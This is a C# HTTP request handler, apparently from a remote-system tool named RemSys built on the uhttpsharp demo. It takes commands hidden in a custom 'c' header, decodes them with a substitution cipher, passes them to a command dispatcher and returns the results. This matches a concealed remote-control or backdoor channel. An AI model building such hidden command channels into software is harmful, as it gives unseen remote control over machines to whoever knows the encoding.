/*
 * Copyright (C) 2011 uhttpsharp project - http://github.com/raistlinthewiz/uhttpsharp
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.

 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.

 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 */

using System;
using System.Text;
using System.Threading.Tasks;
using uhttpsharp;
using uhttpsharp.Headers;
using RemSys_3._0;

namespace uhttpsharpdemo.Handlers
{
    public class IndexHandler : IHttpRequestHandler
    {
        private  HttpResponse _response;
        private  HttpResponse _keepAliveResponse;
        private string cryptRef = @" qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM`1234567890-=[]\;',./~!@#$%^&*()_+{}|:" + Convert.ToString('"') + "<>?";
        private string cryptRef1 = @"zxcvbnmasdfghjklqwertyuiopPOIUYTREWQLKJHGFDSAMNBVCXZ /.,';\][=-0987654321`{}|:" + Convert.ToString('"') + "<>?~!@#$%^&*()_+";
        private string cryptRef2 = @"asdfghjkl;'`1234567890-=qwertyuiop[]\zxcvbnm,./~!@#$%^& *()_+ASDFGHJKL:" + Convert.ToString('"') + "ZXCVBNM<>?QWERTYUIOP{}|";

        public IndexHandler()
        {

        }
        
        public Task Handle(IHttpContext context, Func<Task> next)
        {
            string c = string.Empty;
            foreach(var header in context.Request.Headers)
            {
                if(header.Key == "c")
                {
                    c = header.Value;
                    break;
                }
            }
            if(c == string.Empty)
            {

                byte[] contents = Encoding.UTF8.GetBytes("Flee you lowly peasant!!");
                _keepAliveResponse = new HttpResponse(HttpResponseCode.Ok, contents, true);
                _response = new HttpResponse(HttpResponseCode.Ok, contents, false);
            }
            else
            {
                Data.OnlineCommands com = Data.GetOnlineCommand(context.RemoteEndPoint, SubDecrypt(c), context.RemoteEndPoint.GetHashCode());
                if (com.Status)
                {
                    if(com.Result != string.Empty && com.Result != null)
                    {
                        try
                        {
                            byte[] contents = Encoding.UTF8.GetBytes(string.Format(@"Command: {0} Ok

Result: 
{1}", SubDecrypt(c), com.Result));
                            _keepAliveResponse = new HttpResponse(HttpResponseCode.Ok, contents, true);
                            _response = new HttpResponse(HttpResponseCode.Ok, contents, false);
                        }
                        catch (Exception)
                        {
                        }
                        
                    }
                    else
                    {

                        byte[] contents = Encoding.UTF8.GetBytes("Command: " + SubDecrypt(c) + " Ok");
                        _keepAliveResponse = new HttpResponse(HttpResponseCode.Ok, contents, true);
                        _response = new HttpResponse(HttpResponseCode.Ok, contents, false);
                    }
                }
                else
                {
                    byte[] contents = Encoding.UTF8.GetBytes("Command: " + SubDecrypt(c) + " Failed");
                    _keepAliveResponse = new HttpResponse(HttpResponseCode.Ok, contents, true);
                    _response = new HttpResponse(HttpResponseCode.Ok, contents, false);
                }
            }

            context.Response = context.Request.Headers.KeepAliveConnection() ? _keepAliveResponse : _response;
            return Task.Factory.GetCompleted();
        }

        public string SubDecrypt(string plainText)
        {
            string result = string.Empty;
            foreach (char c in plainText)
            {
                result += cryptRef1[cryptRef2.IndexOf(c)];
            }
            plainText = result;
            result = string.Empty;
            foreach (char c in plainText)
            {
                result += cryptRef[cryptRef1.IndexOf(c)];
            }
            return result;
        }
        public string SubEncrypt(string plaintext)
        {
            string result = string.Empty;
            foreach(char c in string.Format(@"{0}", plaintext))
            {
                try
                {

                    result += cryptRef1[cryptRef.IndexOf(c)];
                }
                catch (Exception)
                {
                }
            }
            plaintext = result;
            result = string.Empty;
            foreach (char c in string.Format(@"{0}", plaintext))
            {
                try
                {
                    result += cryptRef2[cryptRef1.IndexOf(c)];

                }
                catch (Exception)
                {
                }
            }
            return result;
        }
    }
}